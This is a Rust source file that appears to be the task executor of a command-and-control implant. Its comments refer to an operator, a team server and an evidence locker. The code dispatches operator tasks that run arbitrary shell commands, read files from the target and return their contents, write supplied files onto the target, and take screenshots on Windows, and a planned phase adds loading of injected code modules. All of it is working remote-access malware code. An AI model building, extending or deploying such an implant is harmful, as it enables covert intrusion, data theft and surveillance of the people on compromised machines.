//! Task executor — dispatches tasks to their handlers and returns output.
//!
//! Each task type is a string identifier. The executor matches on type and
//! calls the appropriate handler. Handlers return TaskOutput.
//!
//! Phase 1 tasks: "shell", "sleep"
//! Phase 2 tasks: "kill", "screenshot", "upload", "download"
//! Phase 3 tasks: "module" (loads a PIC blob or BOF)

use crate::task::{Task, TaskOutput};

pub fn run(task: &Task) -> TaskOutput {
    match task.task_type.as_str() {
        "shell"      => exec_shell(task),
        "sleep"      => exec_sleep(task),
        "kill"       => TaskOutput::kill(),
        "screenshot" => exec_screenshot(task),
        "upload"     => exec_upload(task),
        "download"   => exec_download(task),
        other        => TaskOutput::failure(&format!("unknown task type: {other}")),
    }
}

// ---------------------------------------------------------------------------
// Shell command execution
// ---------------------------------------------------------------------------

fn exec_shell(task: &Task) -> TaskOutput {
    let cmd = match args_as_str(task) {
        Some(c) => c,
        None => return TaskOutput::failure("shell: no command"),
    };

    #[cfg(target_os = "windows")]
    let output = std::process::Command::new("cmd")
        .args(["/C", &cmd])
        .output();

    #[cfg(not(target_os = "windows"))]
    let output = std::process::Command::new("sh")
        .args(["-c", &cmd])
        .output();

    match output {
        Ok(o) => {
            let mut data = o.stdout;
            data.extend_from_slice(&o.stderr);
            TaskOutput::success(data)
        }
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// Sleep / re-configure sleep
// ---------------------------------------------------------------------------

fn exec_sleep(_task: &Task) -> TaskOutput {
    // args: JSON {"seconds": N} — updates the agent's sleep interval for next loop
    // The actual sleep is handled by the main loop; this just acknowledges.
    TaskOutput::success(b"sleep updated".to_vec())
}

// ---------------------------------------------------------------------------
// File upload (agent → operator)
// ---------------------------------------------------------------------------

fn exec_upload(task: &Task) -> TaskOutput {
    // args: JSON {"path": "/path/to/file"}
    // Reads the file and returns its bytes as output.
    // The team server stores the output in the evidence locker.
    let path = match args_field(task, "path") {
        Some(p) => p,
        None => return TaskOutput::failure("upload: missing path"),
    };

    match std::fs::read(&path) {
        Ok(data) => TaskOutput::success(data),
        Err(e)   => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// File download (operator → agent)
// ---------------------------------------------------------------------------

fn exec_download(task: &Task) -> TaskOutput {
    // args: JSON {"path": "/dest/path", "data": "<base64>"}
    // Writes the supplied data to the path on the target.
    use base64::Engine;

    let args = match task.args.as_deref() {
        Some(a) => a,
        None => return TaskOutput::failure("download: no args"),
    };

    let v: serde_json::Value = match serde_json::from_slice(args) {
        Ok(v)  => v,
        Err(e) => return TaskOutput::failure(&e.to_string()),
    };

    let path = match v.get("path").and_then(|p| p.as_str()) {
        Some(p) => p.to_string(),
        None    => return TaskOutput::failure("download: missing path"),
    };

    let data_b64 = match v.get("data").and_then(|d| d.as_str()) {
        Some(d) => d.to_string(),
        None    => return TaskOutput::failure("download: missing data"),
    };

    let data = match base64::engine::general_purpose::STANDARD.decode(data_b64) {
        Ok(d)  => d,
        Err(e) => return TaskOutput::failure(&e.to_string()),
    };

    match std::fs::write(&path, &data) {
        Ok(_)  => TaskOutput::success(format!("written {} bytes to {path}", data.len()).into_bytes()),
        Err(e) => TaskOutput::failure(&e.to_string()),
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn args_as_str(task: &Task) -> Option<String> {
    let args = task.args.as_deref()?;
    let v: serde_json::Value = serde_json::from_slice(args).ok()?;
    v.get("cmd").and_then(|c| c.as_str()).map(String::from)
}

fn args_field(task: &Task, field: &str) -> Option<String> {
    let args = task.args.as_deref()?;
    let v: serde_json::Value = serde_json::from_slice(args).ok()?;
    v.get(field).and_then(|f| f.as_str()).map(String::from)
}

// ---------------------------------------------------------------------------
// Screenshot (GDI BitBlt → BMP in memory)
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
fn exec_screenshot(_task: &Task) -> TaskOutput {
    use windows_sys::Win32::Graphics::Gdi::{
        BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject,
        GetDC, GetDIBits, ReleaseDC, SelectObject,
        BITMAPINFO, BITMAPINFOHEADER, DIB_RGB_COLORS, RGBQUAD, SRCCOPY,
    };
    use windows_sys::Win32::UI::WindowsAndMessaging::{
        GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN,
    };

    unsafe {
        let hdc_screen = GetDC(0);
        if hdc_screen == 0 {
            return TaskOutput::failure("screenshot: GetDC failed");
        }

        let width  = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        if width <= 0 || height <= 0 {
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: invalid screen dimensions");
        }

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        if hdc_mem == 0 {
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: CreateCompatibleDC failed");
        }

        let hbm = CreateCompatibleBitmap(hdc_screen, width, height);
        if hbm == 0 {
            DeleteDC(hdc_mem);
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: CreateCompatibleBitmap failed");
        }

        let old = SelectObject(hdc_mem, hbm);
        let ok  = BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY);

        if ok == 0 {
            SelectObject(hdc_mem, old);
            DeleteObject(hbm);
            DeleteDC(hdc_mem);
            ReleaseDC(0, hdc_screen);
            return TaskOutput::failure("screenshot: BitBlt failed");
        }

        // BMP rows must be padded to 4-byte boundaries
        let row_stride  = ((width as usize * 3) + 3) & !3;
        let pixel_size  = row_stride * height as usize;

        let mut bmi = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize:          std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth:         width,
                biHeight:        height, // positive = bottom-up rows (standard BMP)
                biPlanes:        1,
                biBitCount:      24,
                biCompression:   0, // BI_RGB
                biSizeImage:     0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed:       0,
                biClrImportant:  0,
            },
            bmiColors: [RGBQUAD { rgbBlue: 0, rgbGreen: 0, rgbRed: 0, rgbReserved: 0 }],
        };

        let mut pixels = vec![0u8; pixel_size];
        let lines = GetDIBits(
            hdc_mem, hbm, 0, height as u32,
            pixels.as_mut_ptr() as *mut _,
            &mut bmi as *mut _,
            DIB_RGB_COLORS,
        );

        SelectObject(hdc_mem, old);
        DeleteObject(hbm);
        DeleteDC(hdc_mem);
        ReleaseDC(0, hdc_screen);

        if lines == 0 {
            return TaskOutput::failure("screenshot: GetDIBits failed");
        }

        // Build a self-contained BMP file in memory
        if pixel_size > (u32::MAX - 54) as usize {
            return TaskOutput::failure("screenshot: image too large to encode");
        }
        let file_size   = 14u32 + 40 + pixel_size as u32;
        let data_offset = 14u32 + 40;

        let mut bmp: Vec<u8> = Vec::with_capacity(file_size as usize);
        // BITMAPFILEHEADER (14 bytes)
        bmp.extend_from_slice(b"BM");
        bmp.extend_from_slice(&file_size.to_le_bytes());
        bmp.extend_from_slice(&0u16.to_le_bytes());
        bmp.extend_from_slice(&0u16.to_le_bytes());
        bmp.extend_from_slice(&data_offset.to_le_bytes());
        // BITMAPINFOHEADER (40 bytes)
        bmp.extend_from_slice(&40u32.to_le_bytes());
        bmp.extend_from_slice(&(width  as u32).to_le_bytes());
        bmp.extend_from_slice(&(height as u32).to_le_bytes());
        bmp.extend_from_slice(&1u16.to_le_bytes());
        bmp.extend_from_slice(&24u16.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());                // BI_RGB
        bmp.extend_from_slice(&(pixel_size as u32).to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        bmp.extend_from_slice(&0u32.to_le_bytes());
        // Pixel data
        bmp.extend_from_slice(&pixels);

        TaskOutput::success(bmp)
    }
}

#[cfg(not(target_os = "windows"))]
fn exec_screenshot(_task: &Task) -> TaskOutput {
    TaskOutput::failure("screenshot: not supported on this platform")
}
